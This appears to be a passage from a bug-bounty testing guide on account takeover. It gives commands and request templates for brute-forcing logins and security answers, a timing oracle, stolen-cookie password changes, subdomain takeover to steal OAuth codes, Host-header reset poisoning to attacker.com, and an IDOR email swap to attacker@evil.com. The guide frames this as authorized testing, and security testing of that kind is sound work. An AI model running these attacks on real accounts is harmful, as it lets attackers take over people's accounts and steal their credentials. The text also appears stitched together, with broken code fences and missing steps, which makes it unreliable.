**Verified grounding for this class:** [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) (node `jsonwebtoken` <4.2.2 — alg confusion / none bypass), [CVE-2016-10555](https://nvd.nist.gov/vuln/detail/CVE-2016-10555) (`jwt-simple` RS256→HS256). **Validate:** forged token must reach a privileged endpoint as victim B (e.g. `GET /api/admin` or `/api/users/B`) — decoding/forging is not impact; an authorized action under B's identity is. If the server ignores the forged `sub` and keys off the session cookie, the JWT is not the trust boundary — no finding.

# (a) password-change endpoint accepts a new password with no current-password / no MFA challenge:
POST /api/account/password
Cookie: session=STOLEN_B_COOKIE        # from XSS, session-fixation, or token leak
{"new_password":"Pwned#2026"}          # no "current_password" field

# (b) login oracle to find a valid password without an existing cookie — measure response delta:
for p in $(cat candidates.txt); do
  t=$(curl -s -o /dev/null -w '%{time_total}' -d "user=victimB&pass=$p" https://target.com/login)
  printf '%s\t%s\n' "$t" "$p"
done | sort -n     # bcrypt-vs-fast-reject timing gap, or response-length diff, leaks valid pass
```
A no-step-up password-change endpoint is the **persistence multiplier**: cookie theft (transient) + this = attacker sets a new password from the stolen cookie → owns B from any device/IP, victim locked out. **False-positive check:** confirm there is genuinely no current-password / MFA gate — many APIs accept the field as optional but still 403 server-side; replay without the field and read the actual state change (try logging in with the new password from a clean browser).

# Security answers are low-entropy and often unthrottled. Brute the recovery-answer endpoint:
ffuf -u "https://target.com/account/recover/answer" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","question":"pet","answer":"FUZZ"}' \
  -w common-answers.txt -mc 200 -fr "incorrect" -t 5

# and: question itself reveals PII the answer to which is OSINT-able (mother maiden, first school)
```
Pair with `offensive-osint`: many "secret" answers (birth city, pet, school) are public on social profiles → no brute needed. **Validate** by completing the recovery flow end-to-end into a session on account B.

# (b) find a dangling subdomain (CNAME -> deprovisioned Heroku/S3/Azure/GH-Pages) via hunt-subdomain:
dig +short staging.target.com    # CNAME -> nonexistent-app.herokuapp.com  (NXDOMAIN on the target)

# (d) send victim B the crafted authorize URL -> their code/token lands on your claimed subdomain
```
**Confirmation = OOB:** the auth `code` (or implicit `access_token`) must actually arrive at the host you claimed — log it server-side and exchange it for B's token. A redirect_uri that merely *reflects* an off-origin value but bounces the code through a server-pinned exchange is not exploitable. Decode any error body as JSON, not substring — `AADSTS50076` / claims-challenge responses contain a literal `access_token` substring inside the claims field that is NOT a usable token.

### Path 10: Pre-Account / Unverified-Account Takeover
The victim's account exists in a pending/unverified state (invite not accepted, signup email never confirmed, or no email on file). Claim it first: register or attach your controlled email to that identity, then let the victim complete SSO/OTP login and inherit the attacker-seeded state — or trigger a reset once your email is attached. Test invite/pending flows and any endpoint that writes an email to an account lacking a confirmed one; confirm the victim, after signing in, lands in the account you seeded. High impact, no token interaction. Disclosed: reports/1679734, reports/394329.

### Path 11: Passwordless / Magic-Link Abuse by Identifier
A passwordless-signup / magic-login / OTP-login endpoint that sets or resets a password (or issues a session) given only an enumerable identifier (phone/email), with no token step. Probe `*passwordless*`, `*magic*`, `*/otp-login`, `*/signup`: does supplying only a phone/email set the password or return a session for that identity? Enumerate identifiers to prove arbitrary-account reach; validate by taking test account B via its number alone. Disclosed: reports/143717.

## Related Skills & Chains

- **`hunt-idor`** — The most reliable ATO primitive that needs no email control and no race. Chain primitive: `PATCH /api/users/{victimB_uid}` with attacker-A session + victim UID + `{"email":"attacker@evil.com"}` → trigger password reset → reset email arrives at attacker → full ATO, zero victim interaction (Path 5 + IDOR = Critical).
- **`hunt-mfa-bypass`** — Path 7 is only Critical if it also bypasses MFA. Chain primitive: password-change endpoint accepts a new password with no current-password challenge AND no MFA step-up → cookie theft (XSS / token leak) + login timing oracle → set new password from the stolen cookie → MFA-less ATO from any IP/device.
- **`hunt-oauth`** — Path 9 lives here. Chain primitive: `redirect_uri` validation accepts subdomain match (`*.target.com`) + `hunt-subdomain` reveals a dangling CNAME on `staging.target.com` → claim it on Heroku/S3 → host an OAuth callback → victim clicks the crafted authorize URL → code lands on the attacker subdomain → exchange for token → ATO. Always JSON-parse OAuth error bodies; never substring-match `access_token`.
- **`hunt-api-misconfig`** — Path 6 (JWT) detail lives here too: alg:none, RS256→HS256 key confusion (sign with the JWKS public key as the HMAC secret), `kid` path-traversal / SQLi, and weak-secret cracking (`hashcat -m 16500`). Load it together with this skill for the JWK→PEM conversion mechanics.
- **`hunt-host-header`** — Path 1 canonical primitive. Chain primitive: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.com` → mailer builds the link from the request Host → link points to `attacker.com/reset?token=XXXX` → victim clicks → token leaked → ATO. Confirm via Collaborator-hosted domain reading the real email, not the reflected header.
- **`offensive-osint`** — Path 8 force-multiplier: most security-question answers (birth city, pet, first school, mother's maiden name) are OSINT-able from social profiles → recover account B with no brute force at all.
- **`security-arsenal`** — Pull the Password-Reset Bypass Tables (`X-Forwarded-Host`, `X-Host`, `X-HTTP-Host-Override`, dual-Host smuggling), token-entropy payloads (sequential numeric, time-based predictable), the JWT attack table, and the always-rejected list for "rate-limit on /forgot-password" reports.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an ATO that needs the victim to click a link AND enter credentials AND pass CAPTCHA. The reproducibility step (10-minute fresh-browser walkthrough taking over test account B from attacker A's session) separates Critical-paid from Self-XSS-tier rejected.
